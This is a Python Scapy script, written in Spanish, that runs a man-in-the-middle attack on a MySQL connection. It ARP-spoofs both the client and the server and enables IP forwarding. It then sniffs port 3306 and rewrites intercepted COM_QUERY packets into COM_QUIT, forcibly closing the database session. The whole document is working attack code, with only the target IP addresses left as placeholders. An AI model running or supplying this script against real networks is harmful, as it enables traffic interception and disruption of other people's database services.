import time, os, threading
from scapy.all import *

CLIENTE_IP = "xxx.xxx.xxx.xxx"
SERVIDOR_IP = "xxx.xxx.xxx.xxx"
IFACE = "eth0"

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=IFACE, verbose=False)
    if ans: return ans[0][1].hwsrc
    return None

def arp_spoof(target_ip, host_ip, stop_event):
    target_mac = get_mac(target_ip)
    if not target_mac: return
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    while not stop_event.is_set():
        send(arp_packet, iface=IFACE, verbose=False)
        time.sleep(2)
    print(f"[*] Deteniendo ARP spoof para {target_ip}")

def process_packet(packet):
    if packet.haslayer(IP) and packet[IP].src == CLIENTE_IP and packet[IP].dst == SERVIDOR_IP and packet.haslayer(Raw):
        payload_original = packet[Raw].load
        if len(payload_original) > 4 and payload_original[4] == 3:
            print("[!] ATAQUE: Interceptado COM_QUERY. Modificando a COM_QUIT (cierre de sesion).")
            payload_modificado = bytearray(payload_original)
            payload_modificado[4] = 1
            packet[Raw].load = bytes(payload_modificado)
            del packet[IP].chksum
            del packet[TCP].chksum
            sendp(packet, iface=IFACE, verbose=False)
            return
    sendp(packet, iface=IFACE, verbose=False)

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
stop_event = threading.Event()
spoof_servidor_thread = threading.Thread(target=arp_spoof, args=(SERVIDOR_IP, CLIENTE_IP, stop_event))
spoof_cliente_thread = threading.Thread(target=arp_spoof, args=(CLIENTE_IP, SERVIDOR_IP, stop_event))
spoof_servidor_thread.start()
spoof_cliente_thread.start()
print("[*] ATAQUE 'FORZAR CIERRE' ACTIVO. Esperando consultas para modificar...")
try:
    sniff(iface=IFACE, filter="tcp port 3306", prn=process_packet, store=0, stop_filter=lambda p: stop_event.is_set())
except KeyboardInterrupt: pass
finally:
    print("\n[*] Deteniendo ataque y restaurando la red...")
    stop_event.set()
    spoof_servidor_thread.join()
    spoof_cliente_thread.join()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Ataque finalizado.")
